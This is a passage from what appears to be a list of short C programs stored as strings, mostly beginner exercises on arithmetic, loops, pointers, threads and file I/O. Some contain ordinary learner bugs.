    "#include <stdio.h>\n#include <math.h>\nunsigned long long int fact(int);\nlong double expo(double, int);\nint main()\n{\n    printf(\"Hello World\\n\\n\");\n    printf(\"25^.5 = %f\\n\\n\", pow(25, .5));\n    printf(\" 5!  = %llu\\n\", fact(5));\n    printf(\" 9!  = %llu\\n\", fact(9));\n    printf(\"50!  = %llu\\n\", fact(50));\n    printf(\"\\n\");\n    printf(\"e^1             = %Lf\\n\", expo(1, 20));\n    printf(\"exp(1)          = %f\\n\", exp(1));\n    printf(\"e^0             = %Lf\\n\", expo(0, 20));\n    printf(\"exp(0)          = %f\\n\", exp(0));\n    printf(\"e^2             = %Lf\\n\", expo(2, 20));\n    printf(\"exp(2)          = %f\\n\", exp(2));\n    printf(\"e^3             = %Lf\\n\", expo(3, 20));\n    printf(\"exp(3)          = %f\\n\", exp(3));\n    printf(\"e^4             = %Lf\\n\", expo(4, 20));\n    printf(\"exp(4)          = %f\\n\", exp(4));\n    printf(\"e^2+3           = %Lf\\n\", expo(2+3, 20));\n    printf(\"exp(2+3)        = %f\\n\", exp(2+3));\n    printf(\"e^2 * e^3       = %Lf\\n\", (expo(2, 20) * expo(3, 20)));\n    printf(\"exp(2) * exp(3) = %f\\n\", (exp(2) * exp(3)));\n    return 0;\n}\nunsigned long long int fact(int n) {\n  if (n > 1) {\n    return fact(n-1) * n;\n  } else {\n    return n;\n  }\n}\nlong double expo(double x, int n) {\n  if (n > 0) {\n    return expo(x, n-1) + (pow(x, n) / fact(n));\n  } else {\n    return 1;\n  }\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nlong long h(int m,int n)\n{\n    long long ans=1;\n    if(m<n-m)\n        m=n-m;\n    for(int i=m+1;i<=n;i++)\n        ans*=i;\n    for(int j=1;j<=n-m;j++)\n        ans/=j;\n    return ans;\n}\nint main()\n{\n    int m,n;\n    long long option=0;\n    scanf(\"%d%d\",&m,&n);\n    option=h(n,m);\n    printf(\"%lld\",option);\n}",
    "#include <stdio.h>\nint main(void)\n{\n char packageType;\n int foodType = 0, noOfGuests = 0;\n float packagePrice = 0, unitFoodPrice = 0, billAmount = 0;\n printf(\"Enter Package Type: \");\n scanf(\"%c\", &packageType);\n if( packageType == 'S' || packageType == 's')\n {\n  packagePrice = 10000;\n }\n else if( packageType == 'G' || packageType == 'g')\n {\n  packagePrice = 25000;\n }\n else\n {\n  printf(\"Invalid Package Type\");\n  return 0;\n }\n printf(\"Enter food type: \");\n scanf(\"%d\", &foodType);\n if( foodType == 1 )\n {\n  unitFoodPrice = 1000;\n }\n else if( foodType == 2 )\n {\n  unitFoodPrice = 2000;\n }\n else if( foodType == 3 )\n {\n  unitFoodPrice = 1500;\n }\n else\n {\n  printf(\"Invalid Food Type\");\n  return 0;\n }\n printf(\"Enter the number of guests: \");\n scanf(\"%d\", &noOfGuests);\n billAmount = packagePrice + (float)( noOfGuests * unitFoodPrice);\n printf(\"Bill Amount = %.2f\", billAmount);\n return 0;\n}",
    "#include <stdio.h>\nstatic int digit_fifth_power_sum(int n);\nint main() {\n    int sum = 0;\n    for (int i = 2; i < 1000000; i++) {\n        if (digit_fifth_power_sum(i) == i) {\n            sum += i;\n        }\n    }\n    printf(\"%d\\n\", sum);\n}\nstatic int digit_fifth_power_sum(int n) {\n    int sum = 0;\n    while (n > 0) {\n        int d = n % 10;\n        sum += d * d * d * d * d;\n        n /= 10;\n    }\n    return sum;\n}",
    "#include<stdio.h>\nvoid print_form(int n, int m, char c);\nint main() {\n    int n, m;\n    char c;\n    scanf(\"%d\", &n);\n    getchar();\n    scanf(\"%d\", &m);\n    getchar();\n    scanf(\"%c\", &c);\n    print_form(n, m, c);\n    return 0;\n}\nvoid print_form(int n, int m, char c) {\n    int i, j;\n    for(i = 0; i < n; i++) {\n        for(j = 0; j < (m + i); j++) {\n            printf(\"%c\", c);\n        }\n        printf(\"\\n\");\n    }\n}",
    "#include <stdio.h>\nint main()\n{\n    unsigned char a = 5, b = 9;\n    unsigned char num=5;\n    printf(\"a = %d, b = %d\\n\", a, b);\n    printf(\"a&b = %d\\n\", a & b);\n    printf(\"a|b = %d\\n\", a | b);\n    printf(\"a^b = %d\\n\", a ^ b);\n    printf(\"~a = %d\\n\", a = ~a);\n    printf(\"b<<1 = %d\\n\", b << 1);\n    printf(\"b>>1 = %d\\n\", b >> 1);\n    printf(\"%d\",num = ~num);\n    return 0;\n}",
    "#include<stdlib.h>\n#include<stdio.h>\nint main(){\n int i;\n printf(\"Input an integer \");\n if(fscanf((stdin),\"%d\",&i))\n  printf(\"The integer was : %i\\n\",i);\n else{\n  fprintf((stderr),\"Error reading an integet from stdin.\\n\");\n  exit(1);\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <unistd.h>\n#include <stdlib.h>\nint nArgs;\nchar ** parseInputLine(char * input) {\n  char ** tresult=malloc(20*sizeof(char *));\n  int i;\n  for(i=0;i<20;i++) {\n    tresult[i]=malloc(80);\n    tresult[i][0]=0;\n  }\n  nArgs=0;\n  i=0;\n  int charPos=0;\n  while(input[i]!='\\n') {\n    if((input[i]==' ') || (input[i]=='\\t')) {\n      i++;\n      while((input[i]==' ') || (input[i]=='\\t')) {\n i++;\n      }\n      tresult[nArgs][charPos]=0;\n      nArgs++;\n      charPos=0;\n    }\n    if(input[i]!='\\n') {\n      tresult[nArgs][charPos]=input[i];\n      charPos++;\n      i++;\n    }\n    else {\n      tresult[nArgs][charPos]=0;\n    }\n  }\n  tresult[nArgs][charPos]=0;\n  nArgs++;\n  tresult[nArgs]=((void*)0);\n  return tresult;\n}\nint main(int argc,char ** args) {\n  int i,pid;\n  int ** x;\n  char y[100];\n  printf(\"Enter a command: \");\n  fgets(y,100,(stdin));\n  x=parseInputLine(y);\n  execvp(x[0],x);\n  exit(0);\n  for(i=0;i<200;i++) {\n    free(x[i]);\n  }\n  free(x);\n}",
    "#include <stdio.h>\n#include <string.h>\nchar* find(char *haystack, char needle);\nint main(){\n    char sentence[400];\n    char word;\n    int position;\n    fgets(sentence, 400, (stdin));\n    scanf(\"%c\", &word);\n    position = find(sentence, word) - sentence;\n    if(find(sentence, word)){\n        printf(\"%d\", position);\n    }else{\n        printf(\"%d\", -1);\n    }\n    return 0;\n}\nchar* find(char *haystack, char needle){\n    int count;\n    for(count = 0; count < strlen(haystack); count++){\n        if(haystack[count] == needle){\n            return &haystack[count];\n        }\n    }\n    return ((void*)0);\n}",
    "#include <stdio.h>\n#include <unistd.h>\n#include <stdlib.h>\nint main()\n{\n while (1) {\n  printf(\"Hello, world! PID = %d\\n\", getpid());\n  usleep(10000);\n }\n exit(0);\n}",
    "#include<stdio.h>\nint main()\n{\n    int year;\n    printf(\"\\nEnter the year: \");\n    scanf(\"%d\",&year);\n    if (((year % 4 == 0) && (year % 100 != 0)) || year % 400 == 0)\n        printf(\"\\nThe entered year is a Leap Year\");\n    else\n        printf(\"\\nThe entered year is not a Leap Year\");\n    return 0;\n    }",
    "int a[] = {0, 1, 2};\nint main() {\n    return a[0];\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n#include<time.h>\n\nint main(){\n    int a[17];\n    printf(\"sizeof(a)/sizeof(a[0])==17 is %s\\n\", sizeof(a)/sizeof(a[0])==17? \"True\":\"False\");\n    int twoDArray[3][5];\n    printf(\"sizeof(twoDArray[3][5]): %lu, sizeof(twoDArray[3]): %lu\", sizeof(twoDArray), sizeof(twoDArray[3]));\n    int c[17];\n    srand(time(((void*)0)));\n    for(int i = 0; i< 17; ++i) c[i] = rand()% 17;\n    printf(\"\\n\");\n    for(int i = 0; i< 17; ++i) printf(\"%d \", c[i]);\n    printf(\"\\n\");\n    int *d=((void*)0);\n    int b = 1;\n    d = &b;\n    printf(\"%d\\n\", *d);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\nint main() {\n int n, i;\n scanf(\"%d\",&n);\n int arr[n+1], j, x, count = 0;\n for(i = 0; i < n; i ++) {\n  arr[i] = rand() % 10023;\n }\n printf(\"%d\\n\",n);\n for(i = 0; i < n; i ++)\n  printf(\"%d\\n\",arr[i]);\n return 0;\n}",
    "#include <stdio.h>\nint main() {\n    int a, b, c, d, e, f;\n    int perimeter, area;\n    scanf(\"%d\\n%d\\n%d\\n%d\\n%d\\n%d\", &a, &b, &c, &d, &e, &f);\n    perimeter = (a + b + c + d + e + f) + (b + d + f) + (a + c + e);\n    area = (a * (b + d + f) + c * (d + f) + e * f);\n    printf(\"%d\\n%d\\n\", perimeter, area);\n    return 0;\n}",
    "#include <stdio.h>\n#include <semaphore.h>\n#include <pthread.h>\n#include <stdlib.h>\n#include <unistd.h>\nvoid *worker1_func(void *arg);\nvoid *worker2_func(void *arg);\nint operacao_worker1(int *seed);\nint operacao_worker2(int *seed);\nint total_computado;\nint *lista_de_operacoes;\nint proximo_indice;\npthread_mutex_t mutex_total;\npthread_mutex_t mutex_lista;\nvoid *worker1_func(void *arg) {\n    int seed = 0;\n    int contador = 0;\n    while (contador < 2) {\n        int operacao = operacao_worker1(&seed);\n        pthread_mutex_lock(&mutex_total);\n        printf(\"Worker 1 obteve mutex_total\\n\");\n        total_computado += operacao;\n        pthread_mutex_unlock(&mutex_total);\n        printf(\"Worker 1 liberou mutex_total\\n\");\n        pthread_mutex_lock(&mutex_lista);\n        printf(\"Worker 1 obteve mutex_lista\\n\");\n        lista_de_operacoes[proximo_indice++] = operacao;\n        pthread_mutex_unlock(&mutex_lista);\n        printf(\"Worker 1 liberou mutex_lista\\n\");\n        contador += 1;\n    }\n}\nvoid *worker2_func(void *arg) {\n    int seed = 0;\n    int contador = 0;\n    while (contador < 2) {\n        pthread_mutex_lock(&mutex_lista);\n        printf(\"Worker 2 obteve mutex_lista\\n\");\n        lista_de_operacoes[proximo_indice] = operacao_worker2(&seed);\n        pthread_mutex_lock(&mutex_total);\n        printf(\"Worker 2 obteve mutex_total\\n\");\n        total_computado += lista_de_operacoes[proximo_indice++];\n        pthread_mutex_unlock(&mutex_total);\n        printf(\"Worker 2 liberou mutex_total\\n\");\n        pthread_mutex_unlock(&mutex_lista);\n        printf(\"Worker 2 liberou mutex_lista\\n\");\n        contador += 1;\n    }\n}\nint operacao_worker1(int *seed) {\n    int operacao = rand_r(seed) % 5;\n    printf(\"Worker 1 produziu %d\\n\", operacao);\n    usleep(operacao * 1000);\n    return operacao;\n}\nint operacao_worker2(int *seed) {\n    int operacao = rand_r(seed) % 3;\n    printf(\"Worker 2 produziu %d\\n\", operacao);\n    usleep(operacao * 1000);\n    return operacao;\n}\nvoid main(int argc, char *argv[]) {\n    proximo_indice = 0;\n    lista_de_operacoes = malloc(sizeof(int) * 40);\n    total_computado = 0;\n    pthread_mutex_init(&mutex_lista, ((void*)0));\n    pthread_mutex_init(&mutex_total, ((void*)0));\n    pthread_t worker1, worker2;\n    pthread_create(&worker1, ((void*)0), worker1_func, ((void*)0));\n    pthread_create(&worker2, ((void*)0), worker2_func, ((void*)0));\n    pthread_join(worker1, ((void*)0));\n    pthread_join(worker2, ((void*)0));\n    printf(\"Total das opera\u00e7\u00f5es: %d\\n\", total_computado);\n    pthread_mutex_destroy(&mutex_lista);\n    pthread_mutex_destroy(&mutex_total);\n    free(lista_de_operacoes);\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <math.h>\nint main(void) {\n    unsigned int n, m, a;\n scanf(\"%u %u %u\", &n, &m, &a);\n printf(\"%llu\\n\", (unsigned long long)(ceil(n / (long double)a) * ceil(m / (long double)a)));\n}",
    "#include <stdio.h>\nint main()\n{\n int x;\n while((x = getchar()) != (-1))\n  printf(\"%d \", x);\n return 0;\n}",
    "#include<stdio.h>\nint main(){\n    int start=100,end=999;\n    int n=start;\n    while(n<=end){\n        int a,b,c;\n        a=n/100;\n        b=(n%100)/10;\n        c=n%10;\n        if(a*a*a+b*b*b+c*c*c==n)\n            printf(\"%d\\n\",n);\n        n++;\n    }\n}",
    "#include <stdio.h>\nint main(void)\n{\n    printf(\"HelloWorld\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n int main(){\n    time_t init, fim;\n    init= time(((void*)0));\n    long int soma=0, N= 100000;\n    while(N>0){\n    soma+= N;\n    N--;\n    }\n    fim= time(((void*)0));\n    time_t tempo_percorrido = fim - init;\n    printf(\"\\nTempo de execu\u00e7\u00e3o: %ld\\n\", tempo_percorrido);\n     return 0;\n }",
    "int main() {\n    int a = 0;\n    int b = 1;\n    int ret = 0;\n    switch (a) {\n    case 0: {\n        switch (b) {\n        case 0: {\n            ret += 1;\n            break;\n        }\n        case 1: {\n            ret += 2;\n            break;\n        }\n        default: {\n            ret += 4;\n            break;\n        }\n        }\n        break;\n    }\n    case 1: {\n        ret += 8;\n        break;\n    }\n    default: {\n        ret += 16;\n        break;\n    }\n    }\n    return ret;\n}",
    "#include <stdio.h>\nint main()\n{\n        float AV1, AV2, media;\n    printf (\"\\nInforme a nota da AV1=\\n\");\n    scanf (\"%f\", &AV1);\n    printf (\"\\nInforme a nota da AV2=\\n \");\n    scanf (\"%f\", &AV2);\n    media =(AV1 + AV2)/2;\n    if (media >= 6.0)\n        printf (\"\\nAprovado!! Sua media \u00e9 = \" \"%f\", media);\n    else\n        printf (\"\\nReprovado, Sua media foi = \" \"%f\", media);\nreturn 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid one() {\n    char *ptr = ((void*)0);\n    char *buflist = ((void*)0);\n    buflist = (char *) malloc(1024);\n    ptr = (char *) (*((unsigned long *) buflist));\n    printf(\"----------------------------------\\n\");\n    if (ptr == ((void*)0)) {\n        printf(\"error\");\n        exit(1);\n    } else {\n        printf(\"ptr != NULL\");\n    }\n    for (int i = 0; i < 5; ++i) {\n        ptr[i] = (char) i;\n    }\n    for (int i = 0; i < 5; ++i) {\n        printf(\"%d\\n\", *(ptr++));\n    }\n}\nint main() {\n    one();\n}",
    "#include <math.h>\n#include <stdio.h>\nint main()\n{\n    int i, count = 32;\n    for (i = 0 ; i < count ; ++i)\n    {\n        double a = 3.141592654 / 2 / count * i;\n        double s = sin(a) * (1 << 16);\n        double c = cos(a) * (1 << 16);\n        printf(\"    {%d, %d},\\n\", (int)s, (int)c);\n    }\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main() {\n    char frase[41];\n    printf(\"String: \");\n    fgets( frase, 41, (stdin) );\n    frase[strlen(frase)-1] = '\\0';\n    printf(\"\\n\\n%c, %c, %c, %c.\", frase[0], frase[1], frase[2], frase[3]);\n    return 0;\n}",
    "int inc (int i);\nint N = 5;\nint main() {\n int n = N;\n int a[5] = {};\n int i = 0;\n for(;i<n;i++) {\n  a[i] = i+1;\n }\n int r = 0;\n for(i=0;i<n;i++) {\n  r += a[i];\n }\n return r;\n}\nint inc(int i) {\n return i + 1;\n}",
    "#include <stdio.h>\n#include <string.h>\nint func(int x)\n{\n printf(\"%d\\n\", x);\n}\nint main()\n{\n printf(\"Start\\n\");\n func(15);\n printf(\"End\\n\");\n}",
    "#include <stdio.h>\nint main() {\n  int s, f, t, chicken, rabbit, crab;\n  scanf(\"%d\\n%d\\n%d\", &s, &f, &t);\n  crab = s - t;\n  rabbit = (f - 8 * crab) / 2 - t;\n  chicken = s - (rabbit + crab);\n  printf(\"%d\\n%d\\n%d\", chicken, rabbit, crab);\n  return 0;\n}",
    "#include <limits.h>\n#include <stdio.h>\nstatic int read_max_product(int n)\n{\n    int acc = 1, max_neg = (-2147483647 -1);\n    while (n-- > 0) {\n        int x = 0;\n        (void)scanf(\"%d\", &x);\n        if (x != 0) {\n            if (x < 0 && max_neg < x) max_neg = x;\n            acc *= x;\n            printf(\"(%d)\\n\", acc);\n        }\n    }\n    if (acc < 0) acc /= max_neg;\n    return acc;\n}\nint main(void)\n{\n    int t = 0;\n    for ((void)scanf(\"%d\", &t); t > 0; --t) {\n        int n = 0;\n        (void)scanf(\"%d\", &n);\n        printf(\"%d\\n\", read_max_product(n));\n    }\n}",
    "#include <stdio.h>\n#include <string.h>\nconst char *hex_to_oct(const char *hex)\n{\n\n    static char octal[23];\n    memset(octal, '\\0', 23);\n    unsigned long long decimal = 0;\n    int i = 0;\n    int len;\n    if (hex == ((void*)0))\n    {\n        return octal;\n    }\n    while (*hex != '\\n' && *hex != '\\0')\n    {\n        char ch = *hex;\n        if (ch >= '0' && ch <= '9')\n        {\n            ch -= '0';\n        }\n        else if (ch >= 'a' && ch <= 'f')\n        {\n            ch = ch - 'a' + 10;\n        }\n        else if (ch >= 'A' && ch <= 'F')\n        {\n            ch = ch - 'A' + 10;\n        }\n        else\n        {\n            printf(\"Invalid hexadecimal input: %c\\n\", ch);\n            break;\n        }\n        decimal *= 16;\n        decimal += ch;\n        hex++;\n    }\n    if (decimal == 0)\n    {\n        octal[0] = '0';\n        len = 1;\n    }\n    else\n    {\n        i = 0;\n        while (decimal > 0)\n        {\n            octal[i] = '0' + decimal % 8;\n            i++;\n            decimal /= 8;\n        }\n        len = i;\n    }\n    octal[len] = '\\0';\n    for (i = 0; i < len / 2; i++)\n    {\n        char tmp = octal[i];\n        octal[i] = octal[len - i - 1];\n        octal[len - i - 1] = tmp;\n    }\n    return octal;\n}\nint main()\n{\n\n    char hex[17];\n    printf(\"Enter any hexadecimal number: \");\n    fgets(hex, 17, (stdin));\n    const char *octal = hex_to_oct(hex);\n    printf(\"Hexadecimal number = %s\\n\", hex);\n    printf(\"Octal number = %s\\n\", octal);\n    return 0;\n}\n",
    "#include <stdlib.h>\n#include <stdio.h>\n#include <pthread.h>\n#include<semaphore.h>\n\nsem_t semodd;\nsem_t semeven;\nvoid* odd(){\n    for (int i =1; i<100; i+=2){\n        sem_wait(&semodd);\n        printf(\"odd thread output = %d\\n\", i);\n        sem_post(&semeven);\n    }\n    return ((void*)0);\n}\nvoid* even(){\n    for (int i =2; i<=100; i+=2){\n        sem_wait(&semeven);\n        printf(\"even thread output = %d\\n\", i);\n        sem_post(&semodd);\n    }\n    return ((void*)0);\n}\nint main(int argc, char* argv[]) {\n    pthread_t p1, p2;\n    sem_init(&semodd, 0, 1);\n    sem_init(&semeven, 0, 0);\n    pthread_create(&p1, ((void*)0), &odd, ((void*)0));\n    pthread_create(&p2, ((void*)0), &even, ((void*)0));\n    pthread_join(p1, ((void*)0));\n    pthread_join(p2, ((void*)0));\n    sem_destroy(&semeven);\n    sem_destroy(&semodd);\n    return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char const *argv[])\n{\n int a=1,b=2;\n int*p=&a;\n int*q=p;\n printf(\"a=%d, b=%d, *p=%d *q=%d\\n\",a,b,*p,*q );\n a=3;\n printf(\"a=%d, b=%d, *p=%d *q=%d\\n\",a,b,*p,*q );\n b=*q+10;\n printf(\"a=%d, b=%d, *p=%d *q=%d\\n\",a,b,*p );\n}",
    "#include <stdio.h>\n#include <stdint.h>\n\nint main(void) {\n  int32_t i,a0,a1;\n  const int32_t q = 1073479681;\n  const int32_t alpha = (q-1)/(1 << 12);\n  for(i=-(q-1)/2;i<=(q-1)/2;i++) {\n    a1 = (i + (i >> 12) + (i >> 24) + (1 << 17)) >> 18;\n    a0 = i - a1*alpha;\n    if(a0 > alpha/2)\n      printf(\"ERROR4: %d\\n\", i);\n    if(a0 <= -alpha/2)\n      printf(\"ERROR5: %d\\n\", i);\n  }\n  return 0;\n}",
    "#include <stdio.h>\nint arraySum(int values[], int numberOfElements)\n{\n int i, sum = 0;\n for(i = 0; i < numberOfElements; ++i)\n  sum += values[i];\n return sum;\n}\nint main(void)\n{\n int result;\n int array1[6] = {13, 12, 45, 67, 12, 34};\n int array2[5] = {98, -12, -76, 98, 23};\n int arraySum(int values[], int numberOfElements);\n result = arraySum(array1, 6);\n printf(\"The sum of ememetns of array1[6] is %i\\n\", result);\n result = arraySum(array2, 5);\n printf(\"The sum of ememetns of array1[5] is %i\\n\", result);\n return 0;\n}",
    "#include <stdint.h>\nint oval;\nint32_t ival=1234;\nshort f16_from_int(int32_t v)\n{\n    return (v+1)>>5;\n}\nint main()\n{\n    oval = f16_from_int(ival);\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\nvoid create( char s[], char w[] );\nvoid clear();\nvoid create( char s[], char w[] ) {\n    int len = strlen( s );\n    int j;\n    for ( j = 0 ; j < len ; j++ )\n        w[ j ] = '-';\n    w[ len ] = '\\0';\n}\nvoid clear() {\n}\nvoid draw(int erros) {\n    printf(\"\\n\");\n    printf(\" +-----+   \\n\");\n    printf(\" |     |   \\n\");\n    switch(erros) {\n    case 0:\n        printf(\" |        \\n\");\n        printf(\" |     \\n\");\n        printf(\" |      \\n\");\n        break;\n    case 1:\n        printf(\" |     o   \\n\");\n        printf(\" |     \\n\");\n        printf(\" |     \\n\");\n        break;\n    case 2:\n        printf(\" |     o   \\n\");\n        printf(\" |     O \\n\");\n        printf(\" |      \\n\");\n        break;\n    case 3:\n        printf(\" |     o   \\n\");\n        printf(\" |    /O \\n\");\n        printf(\" |     \\n\");\n        break;\n    case 4:\n        printf(\" |     o   \\n\");\n        printf(\" |    /O\\\\ \\n\");\n        printf(\" |      \\n\");\n        break;\n    case 5:\n        printf(\" |     o   \\n\");\n        printf(\" |    /O\\\\ \\n\");\n        printf(\" |    /  \\n\");\n        break;\n    case 6:\n        printf(\" |     o   \\n\");\n        printf(\" |    /O\\\\ \\n\");\n        printf(\" |    / \\\\ \\n\");\n        break;\n    }\n    printf(\" |         \\n\");\n    printf(\"/ \\\\      \\n\");\n    printf(\"\\n\\n\");\n}\nint main() {\n    char secret[100];\n    char word[100];\n    int erros = 0;\n    char letra;\n    printf(\"*Jogo da Forca, (c) 2015*\\n\");\n    printf(\"Informe a palavra secreta: \");\n    scanf(\"%s\", secret);\n    clear();\n    create(secret, word);\n    while (erros < 6 ) {\n        printf(\"[%s]\\n\", word);\n        draw(erros);\n        printf(\"Informe uma letra:\");\n        scanf(\"%c\", &letra);\n        scanf(\"%c\", &letra);\n        printf(\"A letra informada foi: [%c]\\n\", letra);\n        erros++;\n    }\n    draw(erros);\n    printf(\"*FIM*\\n\");\n    return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    const unsigned int TWO = 2;\n    int in;\n    unsigned int even_cnt = 0;\n    unsigned int odd_cnt = 0;\n    int even_sum = 0;\n    int odd_sum = 0;\n    float even_mean = 0;\n    float odd_mean = 0;\n    printf(\"Enter intergers with 0 to stop.\\n\");\n    while (scanf(\"%d\", &in) == 1 && in != 0)\n    {\n        if (in % TWO == 0)\n        {\n            even_cnt++;\n            even_sum += in;\n        }\n        else\n        {\n            odd_cnt++;\n            odd_sum += in;\n        }\n    }\n    even_mean = even_sum / (float)even_cnt;\n    odd_mean = odd_sum / (float)odd_cnt;\n    printf(\"The count of even integers is %d, and the mean of these integers is %f.\\n\", even_cnt, even_mean);\n    printf(\"The count of odd integers is %d, and the mean of these integers is %f.\\n\", odd_cnt, odd_mean);\n    return 0;\n}",
    "#include <stdio.h>\n\n\n\n\nint main()\n{\n int x[] = {0x0, 0x1, 0x12345678, 0x123456ff, 0x12345600};\n for (int i = 0; i < sizeof x / sizeof *x; ++i)\n {\n  printf(\"%08x are %s all 1 bits\\n\", x[i], (!~(x[i])) ? \"\" : \"not\");\n  printf(\"%08x are %s all 0 bits\\n\", x[i], (!(x[i])) ? \"\" : \"not\");\n  printf(\"%08x has %s all 1 lowest byte\\n\", x[i], (!((x[i])&0xff^0xff)) ? \"\" : \"not\");\n  printf(\"%08x has %s all 0 lowest byte\\n\", x[i], (!((x[i])&0xff)) ? \"\" : \"not\");\n }\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint *make_array(int elem, int val);\nvoid show_array(const int ar[], int n);\nint main(void)\n{\n    int *pa;\n    int size;\n    int value;\n    printf(\"Enter the number of elements: \");\n    scanf(\"%d\", &size);\n    while (size > 0) {\n        printf(\"Enter the initialization value: \");\n        scanf(\"%d\", &value);\n        pa = make_array(size, value);\n        if (pa) {\n            show_array(pa, size);\n            free(pa);\n        }\n        printf(\"Enter the number of elements(<1 to quit): \");\n        scanf(\"%d\", &size);\n    }\n    printf(\"\\n---------------------------------------------\\n\");\n    return 0;\n}\nint *make_array(int elem, int val)\n{\n    int *p;\n    int i;\n    p = (int*) malloc(elem * sizeof(int));\n    for (i = 0; i < elem; i++)\n        p[i] = val;\n    return p;\n}\nvoid show_array(const int ar[], int n)\n{\n    int i;\n    for (i = 0; i < n; i++) {\n        if (i % 8 == 0) putchar('\\n');\n        printf(\"%d \", ar[i]);\n    }\n}",
    "#include <stdio.h>\nint main()\n{\n    int N;\n    int T;\n    int A;\n    int old_A;\n    int i;\n    long long int output;\n    scanf(\"%d %d\", &N, &T);\n    scanf(\"%d\", &A);\n    if(N == 1) {\n        printf(\"%d\\n\", T);\n        return 0;\n    }\n    old_A = A;\n    output = 0;\n    for(i = 1; i < N; i++) {\n        scanf(\"%d\", &A);\n        if((old_A + T) > A) {\n            output += (A - old_A);\n        } else {\n            output += T;\n        }\n        old_A = A;\n    }\n    output += T;\n    printf(\"%lld\\n\", output);\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <time.h>\nint main(int argc, char **argv){\n  FILE *fp;\n  fp = fopen(\"./words_alpha.txt\", \"r\");\n  char *word = argv[1];\n  char buffer[1024];\n  clock_t timer;\n  timer = clock();\n  while(fscanf(fp, \"%1023s\", buffer) ==1){\n    if(strcmp(buffer, word) == 0){\n      break;\n    }\n  }\n  timer = clock()-timer;\n  fclose(fp);\n  double time_taken = ((double)timer)/((clock_t)1000000000);\n  FILE *fp2 = fopen(\"./logs/clog.txt\", \"a\");\n  fprintf(fp2, \"%f\\n\", time_taken);\n  fclose(fp2);\n}",
    "#include<stdio.h>\nlong long jc(long long n)\n{\n long long i,a=1;\n for(i=1;i<=n;i++)\n a=a*i;\n return a;\n}\nint main()\n{\n long long m,n,C;\n scanf(\"%lld%lld\",&m,&n);\n if(m==0)\n printf(\"1\");\n else if(m<n)\n printf(\"1\");\n else\n {\n C=jc(m)/jc(n)/jc(m-n);\n printf(\"%lld\",C);\n    }\n return 0;\n}",
    "#include <stdio.h>\nconst char *buf = \"Hello World !\\n\";\nint main()\n{\n  int i = 0;\n  while(1){\n    for(i=0;i<25000000;i++);\n    puts(\"Hello World !\\n\");\n  }\n  return 0;\n}\nint __errno()\n{\n  return 0;\n}",
    "#include <stdio.h>\nint search (int* list, int size, int d) {\n int start = 0, end = size, mid;\n while (start <= end) {\n  mid = (start+end)/2;\n  if (d <= list [mid]) {\n   end = mid - 1;\n  } else {\n   start = mid + 1;\n  }\n }\n return start;\n}\nvoid moveRight (int* list, int size, int pos) {\n int i = size;\n for (; i > pos; i--) {\n  list [i] = list [i-1];\n }\n}\nvoid insert (int* list, int size, int i) {\n int pos = search (list, size, i);\n moveRight (list, size, pos);\n list [pos] = i;\n}\nvoid insertSort (int* list, int size) {\n int i, t;\n for (i = 1; i < size; i ++) {\n  t = list [i];\n  insert (list, i, t);\n }\n}\nvoid print (int* list, int size) {\n int i;\n for (i = 0; i < size; i ++) {\n  printf (\"%3d\", list [i]);\n }\n printf (\"\\n\");\n}\nint main () {\n int list [100];\n int n, i;\n while (~scanf (\"%d\", &n)) {\n  for (i = 0; i < n; i++) {\n   scanf (\"%d\", &list [i]);\n  }\n  insertSort (list, n);\n  print (list, n);\n  scanf (\"%d\", &i);\n  insert (list, n, i);\n  print (list, n+1);\n }\n return 0;\n}",
    "#include <stdio.h>\nint zbir_po_2cifri(int n) {\n    return n % 100 + n / 100;\n}\nint main() {\n    int i;\n    int count = 0;\n    for(i = 1000; i <= 9999; ++i) {\n        if(i % zbir_po_2cifri(i) == 0) {\n            printf(\"%d\\n\", i);\n            ++count;\n        }\n    }\n    printf(\"Vkupno: %d\\n\", count);\n    return 0;\n}",
    "#include <stdio.h>\n#include <unistd.h>\nint main() {\n  char src[] = \"abcdefg\";\n  char dst[10] = {0};\n  swab(src, dst, 5);\n  printf(\"before: %s\\n\", src);\n  printf(\"after: %s\\n\", dst);\n  return 0;\n}",
    "#include <stdio.h>\nint panduansushu(int number) {\n    int i;\n    if(number < 2) return 0;\n    for(i = 2; i * i < number; i++)\n        if(number % i == 0)\n            return 0;\n    return 1;\n}\nint main() {\n    int i;\n    for(i=100;i<=200;i++){\n        if(panduansushu(i))\n        {printf(\"%d  \",i);}\n    }\n    return 0;\n}",
    "#include <stdio.h>\n\nint strindex(char s[], char t[]) {\n int i, j, k;\n for (i = 0; s[i] != '\\0'; i++) {\n  for (j = i, k = 0; t[k] != '\\0' && s[j] == t[k]; j++, k++);\n  if (k > 0 && t[k] == '\\0') {\n   return i;\n  }\n }\n return -1;\n}\nint main() {\n char s[] = \"Hola, esto es una prueba\";\n char t[] = \"Prueba\";\n int res;\n res = strindex(s, t);\n printf(\"%d\\n\", res);\n}",
    "#include <stdio.h>\n#include <stdint.h>\n#include <stdlib.h>\n\nconst char* FNAME_INPUT = \"plt_text.txt\";\nconst char* FNAME_OUTPUT = \"plt.bin\";\nint main(int argc, char** argv) {\n FILE* input;\n FILE* output;\n uint32_t color;\n char line[16];\n input = fopen(FNAME_INPUT, \"r\");\n if(!input || ferror(input)) {\n  printf(\"Unable to open %s for reading.\\n\", FNAME_INPUT);\n  return 1;\n }\n output = fopen(FNAME_OUTPUT, \"wb\");\n if(!output || ferror(output)) {\n  printf(\"Unable to open %s for writing.\\n\", FNAME_OUTPUT);\n  return 1;\n }\n while(!(feof(input) || ferror(input) || ferror(output))) {\n  fgets(line, sizeof(line), input);\n  color = (uint32_t)strtol(line, ((void*)0), 16);\n  fwrite(&color, sizeof(uint32_t), 1, output);\n }\n return ferror(input) || ferror(output);\n}",
